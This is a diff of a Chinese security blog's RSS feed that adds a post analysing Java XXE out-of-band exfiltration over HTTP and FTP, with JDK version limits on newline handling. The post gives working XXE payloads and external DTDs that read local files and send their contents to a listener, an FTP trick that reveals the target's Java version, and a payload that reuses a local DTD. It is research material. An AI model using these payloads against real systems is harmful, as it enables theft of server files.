@@ -6,8 +6,408 @@
     <description>Recent content in Security on 诗与胡说</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh_cn</language>
-    <copyright>Copyright © 2019 kylinking</copyright>
+    <copyright>Copyright © 2020 kylinking</copyright>
     <atom:link href="https://kylingit.com/categories/security/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>JAVA XXE中两种数据传输形式及相关限制</title>
+      <link>https://kylingit.com/blog/java-xxe%E4%B8%AD%E4%B8%A4%E7%A7%8D%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E5%BD%A2%E5%BC%8F%E5%8F%8A%E7%9B%B8%E5%85%B3%E9%99%90%E5%88%B6/</link>
+      <pubDate>Thu, 07 May 2020 10:40:08 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/java-xxe%E4%B8%AD%E4%B8%A4%E7%A7%8D%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E5%BD%A2%E5%BC%8F%E5%8F%8A%E7%9B%B8%E5%85%B3%E9%99%90%E5%88%B6/</guid>
+      <description>
+
+&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;p&gt;示例代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
+DocumentBuilder dbBuilder = dbFactory.newDocumentBuilder();
+doc = dbBuilder.parse(&amp;quot;xxe.xml&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;http传输&#34;&gt;HTTP传输&lt;/h3&gt;
+
+&lt;p&gt;xxe_http.xml&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
+        &amp;lt;!DOCTYPE ANY [
+                &amp;lt;!ENTITY % dtd SYSTEM &amp;quot;http://127.0.0.1:8080/http.dtd&amp;quot;&amp;gt;
+                %dtd;
+                %http;
+                %send;
+                ]&amp;gt;
+&amp;lt;ANY&amp;gt;xxe&amp;lt;/ANY&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;http.dtd&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;!ENTITY % file SYSTEM &amp;quot;file:///C:/Windows/win.ini&amp;quot;&amp;gt;
+&amp;lt;!ENTITY % http &amp;quot;&amp;lt;!ENTITY &amp;amp;#37; send SYSTEM &#39;http://127.0.0.1:8080/%file;&#39;&amp;gt;&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在&lt;code&gt;dbBuilder.parse(&amp;quot;xxe_http.xml&amp;quot;)&lt;/code&gt;时会产生异常&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;java.net.MalformedURLException: Illegal character in URL
+	at sun.net.www.http.HttpClient.getURLFile(Unknown Source)
+	at sun.net.www.protocol.http.HttpURLConnection.getRequestURI(Unknown Source)
+	at sun.net.www.protocol.http.HttpURLConnection.writeRequests(Unknown Source)
+	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.startPE(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.skipSeparator(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.scanDecls(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.scanDTDInternalSubset(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$DTDDriver.dispatch(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$DTDDriver.next(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$PrologDriver.next(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source)
+	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(Unknown Source)
+	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(Unknown Source)
+	at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(Unknown Source)
+	at com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(Unknown Source)
+	at com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(Unknown Source)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这是因为在&lt;code&gt;rt.jar!/sun/net/www/http/HttpClient.class&lt;/code&gt;中，JDK7u21&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public String getURLFile() throws IOException {
+    String str = this.url.getFile();
+    if (str == null || str.length() == 0) {
+      str = &amp;quot;/&amp;quot;;
+    }
+
+    if (this.usingProxy &amp;amp;&amp;amp; !this.proxyDisabled) {
+        //...
+    }
+    if (str.indexOf(&#39;\n&#39;) == -1) {
+      return str;
+    }
+    throw new MalformedURLException(&amp;quot;Illegal character in URL&amp;quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;能够看到在处理httpURL的时候，如果字符串含有换行符(&lt;code&gt;\n&lt;/code&gt;)就会直接抛出异常，而一般通过http外带基本只能拼接到url中，所以碰到需要往外带的数据含有换行符时就会失败&lt;/p&gt;
+
+&lt;p&gt;对&lt;code&gt;\n&lt;/code&gt;的处理应该在比较早的版本就引入了，从commit中看到最早在05年的代码中就有这块处理，所以默认高版本Java应该是对url都有处理的&lt;/p&gt;
+
+&lt;h3 id=&#34;ftp传输&#34;&gt;FTP传输&lt;/h3&gt;
+
+&lt;p&gt;xxe_ftp.xml&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE ANY [
+&amp;lt;!ENTITY % dtd PUBLIC &amp;quot;-//OXML/XXE/EN&amp;quot; &amp;quot;http://127.0.0.1:8080/ftp.dtd&amp;quot;&amp;gt;
+        %dtd;%ftp;%send;
+        ]&amp;gt;
+&amp;lt;ANY&amp;gt;xxe&amp;lt;/ANY&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;ftp.dtd&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;!ENTITY % file SYSTEM &amp;quot;file:///D:/data.txt&amp;quot;&amp;gt;
+&amp;lt;!ENTITY % ftp &amp;quot;&amp;lt;!ENTITY &amp;amp;#37; send SYSTEM &#39;ftp://fakeuser:%file;@127.0.0.1:2121&#39;&amp;gt;&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code&gt;%file;&lt;/code&gt;的引用有两种方式，一个是在PASS字段引用，一个是在URL路径中引用，两种方式存在一定差异，具体可以见下面情况一分析&lt;/p&gt;
+
+&lt;p&gt;先来看触发XXE的过程中FTP客户端与服务端的交互&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;info: FTP: recvd &#39;USER fakeuser&#39;
+info: FTP: recvd &#39;PASS testdata&#39;
+info: FTP: recvd &#39;TYPE A&#39;
+info: FTP: recvd &#39;CWD .&#39;
+info: FTP: recvd &#39;EPSV ALL&#39;
+info: FTP: recvd &#39;EPSV&#39;
+info: FTP: recvd &#39;EPRT |1|127.0.0.1|50130|&#39;
+info: FTP: recvd &#39;LIST&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到server会向client发送几个指令，包括要求提供用户名密码(数据在此阶段被带出)，切换路径，列出文件等过程。&lt;/p&gt;
+
+&lt;p&gt;使用Everything自带的FTP服务功能，通过抓包观察正常的FTP交互流程，大致是这样子的&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103436.png&#34; alt=&#34;1575011384700&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;注意到发送LIST指令时会返回150和226，那么在xxer中也尽可能模拟这个过程，但是在实际利用中会发现，当xxer服务端接收到LIST指令时，client与server不再有交互了，处于一个互相等待的过程中，具体的原因见下面分析&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;sun.net.ftp.impl.FtpClient&lt;/code&gt;处理&lt;code&gt;LIST&lt;/code&gt;指令的过程中存在一个bug（可能与模拟的ftpserver没有支持所有指令有关），&lt;code&gt;FtpClient.openDataConnection()&lt;/code&gt;方法中，&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103807.png&#34; alt=&#34;1573805362144&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;当ftpserver收到LIST指令后模拟正常ftp通信返回226代码，然后当前socket进入accept，会创建一个新的Socket，接着通过&lt;code&gt;java.net.ServerSocket#implAccept()&lt;/code&gt;方法接受socket连接&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103808.png&#34; alt=&#34;1573805487835&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;但是此时的address是null，也就是说服务端和客户端此时是没有正常建立新的socket的，于是两端都处在等待状态，客户端就会被挂起。&lt;/p&gt;
+
+&lt;p&gt;然而抓包看整个通信过程，client与server的交互与正常的交互是一模一样的，正常ftp服务端收到LIST指令后返回226传输完毕，当前socket会正常关闭，然后等待下一次交互指令，但是在xxer/xxeserv模拟的过程中却会被挂起，这个问题暂时没有解决办法。（passive mode，客户端发送指令使服务端进入被动模式，但没有效果）&lt;/p&gt;
+
+&lt;p&gt;如果这个过程是发生在weblogic端并且Java版本较低时，并不影响数据传输，只是会有一个对ftpserver的长连接，但是如果是在本地通过外部实体的方式解析xml文件，同样会被挂在长连接的过程，于是就有可能无法生成相应的payload&lt;/p&gt;
+
+&lt;p&gt;网上也有相关问题&lt;a href=&#34;https://stackoverflow.com/questions/3666124/ftp-connection-hangs-on-list&#34;&gt;https://stackoverflow.com/questions/3666124/ftp-connection-hangs-on-list&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Tips：如何利用FTP获取目标Java版本&lt;/p&gt;
+
+&lt;p&gt;ftp.dtd&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;!ENTITY % file SYSTEM &amp;quot;file:///D:/data.txt&amp;quot;&amp;gt;
+&amp;lt;!ENTITY % ftp &amp;quot;&amp;lt;!ENTITY &amp;amp;#37; send SYSTEM &#39;ftp://127.0.0.1:2121/%file;&#39;&amp;gt;&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;当不指定用户名和密码直接连接FTP时，client默认会以anonymous登录，密码则是client的Java版本，所以可以利用这个方式获取目标服务器的Java版本：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;info: FTP: recvd &#39;USER anonymous&#39;
+info: FTP: recvd &#39;PASS Java1.7.0_21@&#39;
+info: FTP: recvd &#39;TYPE I&#39;
+info: FTP: recvd &#39;EPSV ALL&#39;
+info: FTP: recvd &#39;EPSV&#39;
+info: FTP: recvd &#39;EPRT |1|127.0.0.1|54357|&#39;
+info: FTP: recvd &#39;RETR tesdata&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;ftp中特殊字符的问题&#34;&gt;FTP中特殊字符的问题&lt;/h4&gt;
+
+&lt;h5 id=&#34;情况一&#34;&gt;情况一&lt;/h5&gt;
+
+&lt;p&gt;各种特殊字符在特定版本下的情况&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;测试的jdk版本：&lt;strong&gt;JDK7u21&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;pwd字段意义：&lt;code&gt;&amp;lt;!ENTITY % ftp &amp;quot;&amp;lt;!ENTITY &amp;amp;#37; send SYSTEM &#39;ftp://fakeuser:%file;@127.0.0.1:2121&#39;&amp;gt;&amp;quot;&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;file字段意义：&lt;code&gt;&amp;lt;!ENTITY % ftp &amp;quot;&amp;lt;!ENTITY &amp;amp;#37; send SYSTEM &#39;ftp://fakeuser:s@127.0.0.1:2121/%file;&#39;&amp;gt;&amp;quot;&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;符号/位置&lt;/th&gt;
+&lt;th&gt;\n&lt;/th&gt;
+&lt;th&gt;[&lt;/th&gt;
+&lt;th&gt;&amp;lsquo;&lt;/th&gt;
+&lt;th&gt;&amp;ldquo;&lt;/th&gt;
+&lt;th&gt;%&lt;/th&gt;
+&lt;th&gt;&amp;amp;&lt;/th&gt;
+&lt;th&gt;@&lt;/th&gt;
+&lt;th&gt;#&lt;/th&gt;
+&lt;th&gt;?&lt;/th&gt;
+&lt;th&gt;/&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;pwd字段&lt;/td&gt;
+&lt;td&gt;√&lt;/td&gt;
+&lt;td&gt;×&lt;/td&gt;
+&lt;td&gt;×&lt;/td&gt;
+&lt;td&gt;√&lt;/td&gt;
+&lt;td&gt;×(*0)&lt;/td&gt;
+&lt;td&gt;×(*0)&lt;/td&gt;
+&lt;td&gt;×(*1)&lt;/td&gt;
+&lt;td&gt;√&lt;/td&gt;
+&lt;td&gt;×&lt;/td&gt;
+&lt;td&gt;×&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;file字段&lt;/td&gt;
+&lt;td&gt;√&lt;/td&gt;
+&lt;td&gt;√&lt;/td&gt;
+&lt;td&gt;×&lt;/td&gt;
+&lt;td&gt;√&lt;/td&gt;
+&lt;td&gt;×&lt;/td&gt;
+&lt;td&gt;×&lt;/td&gt;
+&lt;td&gt;√&lt;/td&gt;
+&lt;td&gt;√(*2)&lt;/td&gt;
+&lt;td&gt;√(*3)&lt;/td&gt;
+&lt;td&gt;√(*4)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;*0：org.xml.sax.SAXParseException：&lt;code&gt;%&lt;/code&gt; &lt;code&gt;&amp;amp;&lt;/code&gt;都有实际意义，不能被正常引用和替换&lt;/li&gt;
+&lt;li&gt;*1：java.net.UnknownHostException：@被当作用户名:密码@主机，不能正确处理&lt;/li&gt;
+&lt;li&gt;*2：会截断&lt;code&gt;#&lt;/code&gt;之后的内容，URL锚点&lt;/li&gt;
+&lt;li&gt;*3：会截断&lt;code&gt;?&lt;/code&gt;之后的内容，URL参数&lt;/li&gt;
+&lt;li&gt;*4：&lt;code&gt;/&lt;/code&gt;分隔的每部分会单独出现在CWD指令中，最后一部分出现在%file&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;解决办法：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;单引号/双引号：能否正常读取取决于参数实体的写法，简单说就是用单引号来防止闭合双引号，用双引号来防止闭合单引号；&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt; &lt;code&gt;%&lt;/code&gt; &lt;code&gt;&amp;amp;&lt;/code&gt;等，通过&lt;code&gt;&amp;lt;![CDATA[&amp;lt;&amp;quot;%&#39;&amp;amp;]]&amp;gt;&lt;/code&gt;忽略特殊字符；&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h5 id=&#34;情况二&#34;&gt;情况二&lt;/h5&gt;
+
+&lt;p&gt;换行符在不同版本下的情况&lt;/p&gt;
+
+&lt;p&gt;jdk7u131与jdk7u141的&lt;a href=&#34;http://hg.openjdk.java.net/jdk7u/jdk7u/jdk/comparison/e890a6aef622/src/share/classes/sun/net/ftp/impl/FtpClient.java&#34;&gt;对比&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103809.png&#34; alt=&#34;1574933020030&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;jdk8u131-b08与jdk8u131-b09的&lt;a href=&#34;http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/comparison/81ddd5fc5a4e/src/share/classes/sun/net/ftp/impl/FtpClient.java&#34;&gt;对比&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103810.png&#34; alt=&#34;1574933574859&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因此，通过ftp外带数据时，Java版本 &lt;strong&gt;&amp;lt;7u141-b00&lt;/strong&gt; 或 &lt;strong&gt;&amp;lt;8u131-b09&lt;/strong&gt; 时才不会受文件中&lt;code&gt;\n&lt;/code&gt;的影响。&lt;/p&gt;
+
+&lt;p&gt;相关链接：&lt;a href=&#34;https://bugzilla.redhat.com/show_bug.cgi?id=1443083&#34;&gt;https://bugzilla.redhat.com/show_bug.cgi?id=1443083&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;上面的修复补丁都是在&lt;code&gt;rt.jar!/sun/net/ftp/impl/FtpClient.class#issueCommand()&lt;/code&gt;中增加对换行符的判断，但是四哥在&lt;a href=&#34;http://scz.617.cn/misc/201911011122.txt&#34;&gt;Java底层修改对XXE利用FTP通道的影响&lt;/a&gt;中提到FTP通道被阻断的时候还没有触发到&lt;code&gt;issueCommand()&lt;/code&gt;，这边也来调试一下&lt;/p&gt;
+
+&lt;p&gt;环境JDK8u141，直接断到&lt;code&gt;issueCommand()&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;发现在8u141中，对&lt;code&gt;\n&lt;/code&gt;的检查确实是在&lt;code&gt;issueCommand()&lt;/code&gt;，RETR返回的数据中如果有换行符就抛出&lt;code&gt;sun.net.ftp.FtpProtocolException: Illegal FTP command&lt;/code&gt;，那么四哥说的在这之前有一个checkURL方法又是在哪里呢，搜一下java源码确定一下引入checkURL是在哪个版本&lt;/p&gt;
+
+&lt;p&gt;最终找到相关更新：&lt;a href=&#34;http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/diff/5652862ec123/src/share/classes/sun/net/www/protocol/ftp/FtpURLConnection.java&#34;&gt;http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/diff/5652862ec123/src/share/classes/sun/net/www/protocol/ftp/FtpURLConnection.java&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;github上相关&lt;a href=&#34;https://github.com/JetBrains/jdk8u_jdk/commit/4aacc0da12ae2f5bb29aa1b304ba62da23bb024a#diff-3f0521a031333913976fe611f840d0ebR160&#34;&gt;commit&lt;/a&gt;，版本是 jdk8u_jdk-jb8u232-b1638.6，时间是2019年4月份&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103811.png&#34; alt=&#34;1574996536989&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;1.8.0_141相关调用栈&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Exception in thread &amp;quot;main&amp;quot; java.io.IOException: sun.net.ftp.FtpProtocolException: Illegal FTP command
+	at sun.net.www.protocol.ftp.FtpURLConnection.getInputStream(FtpURLConnection.java:518)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:623)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(XMLEntityManager.java:1304)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(XMLEntityManager.java:1240)
+	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.startPE(XMLDTDScannerImpl.java:741)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;1.8.0_232相关调用栈&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Exception in thread &amp;quot;main&amp;quot; java.lang.IllegalArgumentException: Illegal character in URL
+	at sun.net.www.protocol.ftp.FtpURLConnection.checkURL(FtpURLConnection.java:164)
+	at sun.net.www.protocol.ftp.FtpURLConnection.&amp;lt;init&amp;gt;(FtpURLConnection.java:188)
+	at sun.net.www.protocol.ftp.Handler.openConnection(Handler.java:61)
+	at sun.net.www.protocol.ftp.Handler.openConnection(Handler.java:56)
+	at java.net.URL.openConnection(URL.java:1001)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:621)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(XMLEntityManager.java:1304)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(XMLEntityManager.java:1240)
+	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.startPE(XMLDTDScannerImpl.java:741)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;综上，利用XXE漏洞通过FTP协议外带数据时，能否成功受Java版本影响，总结如下&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;&amp;lt;7u141-b00&lt;/strong&gt; 或 &lt;strong&gt;&amp;lt;8u131-b09&lt;/strong&gt; ：不会受文件中&lt;code&gt;\n&lt;/code&gt;的影响；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&amp;gt;jdk8u131&lt;/strong&gt;：能创建FTP连接，外带文件内容中含有&lt;code&gt;\n&lt;/code&gt;则抛出异常；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&amp;gt;jdk8u232&lt;/strong&gt;：不能创建FTP连接，只要url中含有&lt;code&gt;\n&lt;/code&gt;就会抛出异常；&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;dtd引用中的问题&#34;&gt;dtd引用中的问题&lt;/h2&gt;
+
+&lt;h3 id=&#34;问题1&#34;&gt;问题1&lt;/h3&gt;
+
+&lt;p&gt;内部实体与外部实体不能结合使用&lt;/p&gt;
+
+&lt;p&gt;有一个需要注意的点是，参数实体只能在DTD中引用，举个例子&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;!ELEMENT person1 (name, sex, age)&amp;gt;
+&amp;lt;!ELEMENT person2 (name, sex, age)&amp;gt;
+&amp;lt;!ELEMENT person3 (name, sex, age)&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;为了减少重复定义某些元素，可以通过参数实体的方式进行定义，如&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;!ELEMENT %res &amp;quot;name, sex, age&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后通过%res进行引用&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;!ELEMENT person1 (%res;)&amp;gt;
+&amp;lt;!ELEMENT person2 (%res;)&amp;gt;
+&amp;lt;!ELEMENT person3 (%res;)&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;但是这种元素替换的方式&lt;strong&gt;仅限于外部DTD&lt;/strong&gt;。在以上过程中，参数实体将元素组保存在DTD的外部子集中，因为内部子集有非常严格的校验，即标记声明中不允许引用参数实体，如下的参数实体引用是会失败的，抛出异常&lt;code&gt;java.io.IOException: org.xml.sax.SAXParseException: The parameter entity reference &amp;quot;%file;&amp;quot; cannot occur within markup in the internal subset of the DTD.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103812.png&#34; alt=&#34;1574842595707&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这些实体可以定义DTD语法，但不能定义在另一个DTD标签中立即引用，如下面的使用也将失败：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;!ENTITY %res &amp;quot;name, sex, age&amp;quot;&amp;gt;
+&amp;lt;!ELEMENT person (%res;)&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;但是，可以通过在外部参数实体中声明，在内部DTD子集中使用的形式：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;!DOCTYPE ANY [
+        &amp;lt;!ENTITY % dtd SYSTEM &amp;quot;http://localhost/my.dtd&amp;quot;&amp;gt;
+&amp;lt;ANY&amp;gt;xxe&amp;lt;/ANY&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;远程my.dtd&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;!ENTITY % file SYSTEM &amp;quot;file:///C:/file&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;总结，对于上面定义的参数实体，需要注意的点是：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;对参数实体的引用只能在DTD中发生；&lt;/li&gt;
+&lt;li&gt;参数实体不能在文档主体中使用；&lt;/li&gt;
+&lt;li&gt;内部DTD子集中的标记内不允许使用参数实体引用；&lt;/li&gt;
+&lt;li&gt;参数实体允许创建其他实体和参数实体；&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;问题2&#34;&gt;问题2&lt;/h3&gt;
+
+&lt;p&gt;无法向外请求dtd&lt;/p&gt;
+
+&lt;p&gt;假如目标系统存在防火墙，无法对外发起连接，就不能通过外部dtd注入了，此时可以利用系统本地已存在的dtd文件，覆盖其中的某个实体，通过报错形式进行利用&lt;/p&gt;
+
+&lt;p&gt;local.dtd&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+
+        &amp;lt;!ENTITY % local_dtd SYSTEM &amp;quot;file:///C:\Windows\System32\xwizard.dtd&amp;quot;&amp;gt;
+
+        &amp;lt;!ENTITY % onerrortypes &#39;(aa) #IMPLIED&amp;gt;
+        &amp;lt;!ENTITY &amp;amp;#x25; file SYSTEM &amp;quot;file:///D:/data.txt&amp;quot;&amp;gt;
+        &amp;lt;!ENTITY &amp;amp;#x25; http &amp;quot;&amp;lt;!ENTITY &amp;amp;#x26;#x25; send SYSTEM &amp;amp;#x27;http://127.0.0.1:8080/&amp;amp;#x25;file;&amp;amp;#x27;&amp;gt;&amp;quot;&amp;gt;
+        &amp;amp;#x25;http;
+        &amp;amp;#x25;send;
+        &amp;lt;!ATTLIST xxe aa &amp;quot;bb&amp;quot; #IMPLIED&#39;&amp;gt;
+        %local_dtd;
+        ]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;xxe_http.xml&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE ANY [
+        &amp;lt;!ENTITY % dtd SYSTEM &amp;quot;http://127.0.0.1:8080/local.dtd&amp;quot;&amp;gt;
+        %dtd;
+        ]&amp;gt;
+&amp;lt;ANY&amp;gt;xxe&amp;lt;/ANY&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;更多的本地dtd可以参考&lt;a href=&#34;https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md&#34;&gt;https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;另一个思路：从目标机器上的jar包中发现可以被利用的本地dtd文件&lt;/p&gt;
+
+&lt;p&gt;参考：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/&#34;&gt;https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/&#34;&gt;https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
     
     <item>
       <title>Apache Solr Velocity模板注入漏洞分析</title>
@@ -15,77 +415,78 @@
       <pubDate>Tue, 05 Nov 2019 09:40:22 +0000</pubDate>
       
       <guid>https://kylingit.com/blog/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
